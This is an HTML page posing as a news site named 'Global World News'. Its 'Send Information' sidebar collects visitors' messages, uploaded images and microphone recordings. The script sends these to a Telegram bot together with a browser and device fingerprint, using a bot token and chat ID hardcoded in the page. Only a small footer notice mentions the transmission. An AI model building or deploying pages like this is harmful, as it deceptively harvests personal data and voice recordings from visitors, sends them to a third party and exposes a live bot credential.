<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Global World News</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin:0;
  font-family: Arial, Helvetica, sans-serif;
  background:#f5f5f5;
}
header {
  background:#111;
  color:#fff;
  padding:20px;
}
header h1 {
  margin:0;
  font-size:28px;
}
nav {
  background:#222;
  color:#ccc;
  padding:10px;
}
nav span {
  margin-right:15px;
}
main {
  display:flex;
  padding:20px;
}
article {
  flex:3;
  background:#fff;
  padding:20px;
  margin-right:20px;
}
aside {
  flex:1;
  background:#fff;
  padding:20px;
}
textarea, input, button {
  width:100%;
  margin-top:10px;
  padding:10px;
}
button {
  background:#111;
  color:#fff;
  border:none;
  cursor:pointer;
}
button:disabled {
  opacity:0.5;
  cursor:not-allowed;
}
footer {
  background:#111;
  color:#ccc;
  font-size:12px;
  padding:15px;
  margin-top:20px;
}
</style>
</head>

<body>

<header>
  <h1>Global World News</h1>
  <p>Independent international coverage</p>
</header>

<nav>
  <span>World</span>
  <span>Politics</span>
  <span>Economy</span>
  <span>Technology</span>
  <span>Conflict</span>
</nav>

<main>
  <article>
    <h2>Breaking News</h2>
    <p>
      International markets react to rising geopolitical tensions
      as leaders meet to discuss global stability and economic growth.
    </p>
  </article>

  <aside>
    <h3>Send Information</h3>

    <textarea id="textMsg" placeholder="Write a message"></textarea>

    <input type="file" id="imageInput" accept="image/*">

    <button id="recordBtn" onclick="recordAudio()">🎙 Record Audio (5s)</button>

    <button onclick="sendText()">Send Text</button>
    <button onclick="sendImage()">Send Image</button>
    <button onclick="sendAudio()">Send Audio</button>
  </aside>
</main>

<footer>
<b>Notice & Consent:</b><br>
This website collects basic technical information such as browser type,
device characteristics, language, screen resolution, and access time.
Any text, images, or audio you submit may be transmitted to an external
Telegram bot for testing and experimental purposes.
</footer>

<script>
/* ====== CONFIG ====== */
const BOT_TOKEN = "8291235224:AAEZKmCrzGtaaRwl4BGSs6goZm9gzzqHunQ";
const CHAT_ID   = "7849887116";
/* ==================== */

function deviceInfo() {
  return `
🕒 Time: ${new Date().toISOString()}
💻 Platform: ${navigator.platform}
🌐 Language: ${navigator.language}
🧭 User-Agent: ${navigator.userAgent}
📐 Screen: \( {screen.width}x \){screen.height}
🧠 Cores: ${navigator.hardwareConcurrency || "N/A"}
💾 Memory: ${navigator.deviceMemory || "N/A"} GB
🌍 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
`;
}

async function sendText() {
  const text = document.getElementById("textMsg").value;
  const message = "📰 NEW TEXT\n" + deviceInfo() + "\n✍️ Message:\n" + text;

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });
    alert("Text sent successfully!");
  } catch (e) {
    alert("Error sending text: " + e.message);
  }
}

async function sendImage() {
  const file = document.getElementById("imageInput").files[0];
  if (!file) return alert("Select image first");

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("caption", "🖼 IMAGE\n" + deviceInfo());
  form.append("photo", file);

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });
    alert("Image sent successfully!");
  } catch (e) {
    alert("Error sending image: " + e.message);
  }
}

/* AUDIO */
let recorder, audioChunks = [];
const recordBtn = document.getElementById("recordBtn");

async function recordAudio() {
  if (recorder && recorder.state === "recording") return;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    recorder = new MediaRecorder(stream, { mimeType: 'audio/ogg;codecs=opus' }); // لـ OGG/OPUS
    audioChunks = [];

    recorder.ondataavailable = e => {
      if (e.data.size > 0) audioChunks.push(e.data);
    };

    recorder.start();
    recordBtn.disabled = true;
    recordBtn.textContent = "Recording... (5s)";

    setTimeout(() => {
      recorder.stop();
      stream.getTracks().forEach(track => track.stop());
      recordBtn.disabled = false;
      recordBtn.textContent = "🎙 Record Audio (5s)";
    }, 5000);

    recorder.onstop = () => {
      sendAudio();
    };
  } catch (e) {
    alert("Error accessing microphone: " + e.message);
  }
}

async function sendAudio() {
  if (audioChunks.length === 0) return alert("No audio recorded");

  const blob = new Blob(audioChunks, { type: 'audio/ogg' });
  const form = new FormData();

  form.append("chat_id", CHAT_ID);
  form.append("caption", "🎙 VOICE MESSAGE\n" + deviceInfo());
  form.append("voice", blob, "voice.ogg"); // اسم الملف مهم: .ogg

  try {
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
      method: "POST",
      body: form
    });
    if (!response.ok) throw new Error("Telegram error: " + response.statusText);
    alert("Voice message sent successfully!");
  } catch (e) {
    // لو فشل sendVoice (مثلاً في Safari)، جرب sendAudio
    alert("Error sending voice: " + e.message + "\nTrying as audio file...");
    form.delete("voice");
    form.append("audio", blob, "audio.ogg");
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
      method: "POST",
      body: form
    });
    alert("Sent as audio file instead.");
  }
}
</script>

</body>
</html>
